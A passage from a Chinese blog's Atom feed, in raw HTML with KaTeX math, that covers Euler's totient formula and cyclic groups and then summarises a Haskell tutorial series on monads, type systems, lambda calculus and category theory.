style="height:0.2769em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。将它们代入上面的公式，我们得到</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><msubsup><mi>p</mi><mn>1</mn><msub><mi>k</mi><mn>1</mn></msub></msubsup><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mn>1</mn></msub></mfrac><mo fence="true">)</mo></mrow><msubsup><mi>p</mi><mn>2</mn><msub><mi>k</mi><mn>2</mn></msub></msubsup><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mn>2</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>⋯</mo><msubsup><mi>p</mi><mi>r</mi><msub><mi>k</mi><mi>r</mi></msub></msubsup><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mi>r</mi></msub></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi(n) = p_1^{k_1}\left(1 - \frac{1}{p_1}\right) p_2^{k_2}\left(1 - \frac{1}{p_2}\right) \cdots p_r^{k_r}\left(1 - \frac{1}{p_r}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.931em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8991em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:-0.0315em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></span></p><p>这可以进一步简化为</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mn>1</mn></msub></mfrac><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mn>2</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>⋯</mo><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><msub><mi>p</mi><mi>r</mi></msub></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi(n) = n\left(1 - \frac{1}{p_1}\right)\left(1 - \frac{1}{p_2}\right) \cdots \left(1 - \frac{1}{p_r}\right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></span></p><h2 id="循环群">循环群</h2><p><strong>循环群</strong>是指能由单个元素所生成的群。设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>G</mi><mo separator="true">,</mo><mo>⋅</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(G, \cdot )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">⋅</span><span class="mclose">)</span></span></span></span>为一个群，若存在一个元素 ，使得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi><mo>=</mo><mrow><mo fence="true">⟨</mo><mtext> </mtext><mi>g</mi><mtext> </mtext><mo fence="true">⟩</mo></mrow><mo>=</mo><mrow><mo fence="true">{</mo><msup><mi>g</mi><mi>k</mi></msup><mi mathvariant="normal">∣</mi><mtext>  </mtext><mi>k</mi><mo>∈</mo><mi mathvariant="double-struck">Z</mi><mo fence="true">}</mo></mrow></mrow><annotation encoding="application/x-tex">G=\left\langle \,g\,\right\rangle =\left\{g^{k}|\;k\in \mathbb {Z} \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">⟨</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mclose delimcenter" style="top:0em;">⟩</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2em;vertical-align:-0.35em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">{</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathbb">Z</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">}</span></span></span></span></span></span>，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>G</mi><mo separator="true">,</mo><mo>⋅</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(G, \cdot )</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">⋅</span><span class="mclose">)</span></span></span></span> 形成循环群。群 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 内任意一个元素所生成的群都是循环群，而且是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的子群。</p><blockquote><p>假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>G</mi><mo separator="true">,</mo><mo>∗</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(G,*)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∗</span><span class="mclose">)</span></span></span></span> 是一个 群（group），若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi></mrow><annotation encoding="application/x-tex">H</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span></span></span></span> 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>G</mi></mrow><annotation encoding="application/x-tex">G</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">G</span></span></span></span> 的一个非空子集（subset）且同时 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi></mrow><annotation encoding="application/x-tex">H</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span></span></span></span> 与相同的二元运算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>∗</mo></mrow><annotation encoding="application/x-tex">*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord">∗</span></span></span></span> 亦构成一个群，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>H</mi><mo separator="true">,</mo><mo>∗</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(H,*)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∗</span><span class="mclose">)</span></span></span></span> 称为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>G</mi><mo separator="true">,</mo><mo>∗</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(G,*)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">G</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∗</span><span class="mclose">)</span></span></span></span> 的一个 <a href="https://zh.wikipedia.org/wiki/%E5%AD%90%E7%BE%A4">子群</a>（subgroup）。</p></blockquote>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-1/&quot; title=&quot;Haskell(一)入门&quot;&gt;Haskell(一)入门&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-2/&quot; title=&quot;Haskell(二)函数式编程&quot;&gt;Haskell(二)函数式编程&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/monad/&quot; title=&quot;Haskell(三) Monad&quot;&gt;Haskell(三) Monad&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-summary-toolchain/&quot; title=&quot;Haskell(四)总结和工具链&quot;&gt;Haskell(四)总结和工具链&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-epilogue/&quot; title=&quot;Haskell(五) 总结和展望&quot;&gt;Haskell(五) 总结和展望&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/project-euler/&quot; title=&quot;Haskell(六) P</summary>
        
      
    
    
    
    <category term="functional language" scheme="https://www.blog-blockchain.xyz/categories/functional-language/"/>
    
    
    <category term="Haskell" scheme="https://www.blog-blockchain.xyz/tags/Haskell/"/>
    
  </entry>
  
  <entry>
    <title>Haskell(五) 总结和展望</title>
    <link href="https://www.blog-blockchain.xyz/fp/Haskell-epilogue/"/>
    <id>https://www.blog-blockchain.xyz/fp/Haskell-epilogue/</id>
    <published>2024-01-09T17:02:33.000Z</published>
    <updated>2024-11-15T14:30:54.923Z</updated>
    
    <content type="html"><![CDATA[<blockquote><ol class="series-items"><li><a href="/fp/FP-haskell-1/" title="Haskell(一)入门">Haskell(一)入门</a></li><li><a href="/fp/FP-haskell-2/" title="Haskell(二)函数式编程">Haskell(二)函数式编程</a></li><li><a href="/fp/monad/" title="Haskell(三) Monad">Haskell(三) Monad</a></li><li><a href="/fp/Haskell-summary-toolchain/" title="Haskell(四)总结和工具链">Haskell(四)总结和工具链</a></li><li><a href="/fp/Haskell-epilogue/" title="Haskell(五) 总结和展望">Haskell(五) 总结和展望</a></li><li><a href="/fp/project-euler/" title="Haskell(六) Project Euler 练习1-26">Haskell(六) Project Euler 练习1-26</a></li></ol></blockquote><p>随着我们深入 Haskell 的世界，我们发现它不仅仅是一种编程语言，而是一种带有丰富理论背景的编程范式。Haskell 的设计思想深植于函数式编程的根基，与 Lambda 演算和范畴论紧密相连，体现了逻辑和数学的美学。</p><ol><li><p>Monad：结构化的复杂性管理<br>在 Haskell 中，Monad 的概念封装了一个层次结构，允许我们在一个定义良好的域内进行操作。Monad 提供了一种方式来构建层次化的结构，支持层次之间的转换。通过 Monad，可以利用自定义的规则进行快速错误处理，无需在每一步都进行错误处理。特别是在 Haskell 中，Monad 以顺序方式组合复杂函数，使不确定的结果、副作用、异常处理都可以通过 Monad 的统一接口进行管理。更进一步，Monad 在程序分析中扮演了重要角色，尤其是在构建抽象解释器和进行静态分析时，处理程序状态的变化。</p></li><li><p>Haskell 的类型系统：参数多态性的优雅<br>与 Java 或 C# 中的接口和常见的泛型不同，Haskell 的类型系统采用了参数多态性。这一机制通过类型推导在编译时实现类型替换，提供了一种更灵活、更精确的多态实现方式。Haskell 中的参数实际上是类型，它们可以携带具体的值，为表达式和类型转换提供了理论基础。从 GHC.Prim 开始，通过类型构造（data）和类型类（typeclass）的逐步构建，Haskell 形成了一个严格和富有创意的类型系统。</p></li><li><p>Lambda 演算和类型推导<br>Lambda 演算不仅是函数式编程的理论基础，而且是 Haskell 类型推导的核心。多态 Lambda 演算（如二阶 Lambda 演算）直接影响了 Haskell 的类型类和类型推理机制。这种关系深化了我们对于类型类如何在 Haskell 中实现多态的理解。</p></li><li><p>范畴论：构建复杂的函数组合<br>Haskell 借鉴了范畴论中的数学模型，如 Monad、Functor 和 Applicative，来实现函数组合和数据流的组织。这些概念不仅提供了一种强大的抽象机制，还使得函数组合和数据流处理更加模块化和灵活。</p></li></ol><p>结语：<br>通过 Haskell，我们不仅学习了一种编程语言，还接触到了一系列深奥的理论概念，这些概念为我们提供了一个全新的视角来看待问题解决和软件设计。Haskell 的学习之旅充满了挑战，但也同样充满了启发。无论是探索 Lambda 演算的深层原理，还是理解如何通过范畴论的抽象来指导函数组合和数据流的处理，Haskell 都为我们打开了通往更深层次理解的大门。<br>最后留着问题，有时间的时候可以看看，欢迎交流：</p><ol><li>Lambda 演算是什么，如何用多态 Lambda 演算来进行类型推导。它和 typeclass 有什么关系。</li><li>为什么采用 Monad、Functor 和 Applicative 这些范畴论的数学模型，来进行函数组合和数据流组合。</li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
&lt;ol class=&quot;series-items&quot;&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-1/&quot; title=&quot;Haskell(一)入门&quot;&gt;Haskell(一)入门&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/FP-haskell-2/&quot; title=&quot;Haskell(二)函数式编程&quot;&gt;Haskell(二)函数式编程&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/monad/&quot; title=&quot;Haskell(三) Monad&quot;&gt;Haskell(三) Monad&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-summary-toolchain/&quot; title=&quot;Haskell(四)总结和工具链&quot;&gt;Haskell(四)总结和工具链&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/Haskell-epilogue/&quot; title=&quot;Haskell(五) 总结和展望&quot;&gt;Haskell(五) 总结和展望&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/fp/project-euler/&quot; title=&quot;Haskell(六) P</summary>
        
      
    
    
    
    <category term="functional language" scheme="https://www.blog-blockchain.xyz/categories/functional-language/"/>
    
    
    <category term="Haskell" scheme="https://www.blog-blockchain.xyz/tags/Haskell/"/>
    
  </entry>
  
  <entry>
    <title>Haskell(四)总结和工具链</title>
    <link href="https://www.blog-blockchain.xyz/fp/Haskell-summary-toolchain/"/>
    <id>https://www.blog-blockchain.xyz/fp/Haskell-summary-toolchain/</id>
    <published>2024-01-08T14:01:33.000Z</published>
    <updated>2024-11-15T14:30:54.923Z</updated>
    
